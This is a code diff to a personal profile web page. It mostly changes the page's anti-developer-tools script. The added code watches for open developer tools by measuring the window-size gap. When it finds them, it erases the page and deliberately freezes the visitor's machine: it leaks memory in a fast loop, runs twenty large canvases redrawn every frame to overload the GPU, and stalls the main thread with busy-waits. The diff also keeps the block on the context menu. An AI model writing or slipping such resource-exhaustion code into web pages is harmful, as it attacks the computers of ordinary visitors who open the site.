@@ -13,7 +13,7 @@ body{
   margin:0;
   font-family:monospace;
   background:#050505 url("c8f31b31a576ab06615b9f4a8bbcd125.jpg")
-             center center / cover no-repeat fixed;
+    center center / cover no-repeat fixed;
   color:#eaeaea;
   overflow:hidden;
 }
@@ -124,7 +124,7 @@ a:hover{text-decoration:underline}
 
     <div class="s">
       <div class="l">links</div>
-      <div class="i"><a href="#">discord</a> — 83pm</div>
+      <div class="i">discord — 83pm</div>
       <div class="i"><a href="https://github.com/K-gay" target="_blank">github</a> — K-gay</div>
       <div class="i">
         <a href="https://www.instagram.com/femboyfraud" target="_blank">
@@ -216,14 +216,45 @@ function draw(){
 draw();
 </script>
 
-<!-- ANTI DEV TOOLS (WIPE MODE) -->
+<!-- ANTI DEV TOOLS : MEMORY LEAK FREEZE -->
 <script>
 (function(){
-  function wipe(){
+  let tripped=false;
+  const threshold=160;
+
+  function freeze(){
+    if(tripped) return;
+    tripped=true;
+
+    // erase UI
     document.documentElement.innerHTML="";
     document.documentElement.style.background="#000";
-    document.body && (document.body.innerHTML="");
-    setInterval(()=>{document.documentElement.innerHTML="";},200);
+
+    // RAM leak
+    const leaks=[];
+    setInterval(()=>{
+      leaks.push(new Array(5e6).fill(Math.random()));
+    },30);
+
+    // GPU overload
+    for(let i=0;i<20;i++){
+      const c=document.createElement("canvas");
+      c.width=c.height=4096;
+      const x=c.getContext("2d");
+      document.body.appendChild(c);
+
+      (function burn(){
+        x.fillStyle=`rgb(${Math.random()*255},0,0)`;
+        x.fillRect(0,0,c.width,c.height);
+        requestAnimationFrame(burn);
+      })();
+    }
+
+    // main thread stall
+    setInterval(()=>{
+      const t=performance.now();
+      while(performance.now()-t<200){}
+    },10);
   }
 
   document.addEventListener("contextmenu",e=>e.preventDefault());
@@ -239,16 +270,12 @@ draw();
     }
   },true);
 
-  const threshold=160;
-  let tripped=false;
-
   function detect(){
     try{
       const wGap=window.outerWidth-window.innerWidth;
       const hGap=window.outerHeight-window.innerHeight;
-      if((wGap>threshold || hGap>threshold) && !tripped){
-        tripped=true;
-        wipe();
+      if(wGap>threshold || hGap>threshold){
+        freeze();
       }
     }catch(e){}
   }
